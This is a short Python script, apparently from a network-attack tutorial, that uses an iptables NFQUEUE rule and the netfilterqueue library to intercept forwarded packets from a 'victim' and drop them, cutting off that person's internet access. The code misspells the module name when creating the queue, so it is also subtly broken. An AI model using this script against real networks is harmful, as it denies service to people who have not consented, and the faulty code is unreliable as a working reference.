# iptables -I FORWARD -j NFQUEUE --queue-num 0 -> can be automated using subprocess module
# pip install netfilterqueue
# iptables --flush --> To delete IP Tables created at the start

#!/usr/bin/env python
import netfilterqueue

def process_packet(packet):
    print(packet)
    #packet.accept() # to forward the packets from victim to the destination
    packet.drop() # to drop the packets from victim to the destination thereby blocking the internet access

queue = netfileterqueue.NetfilterQueue()
queue.bind(0, process_packet)  
queue.run()

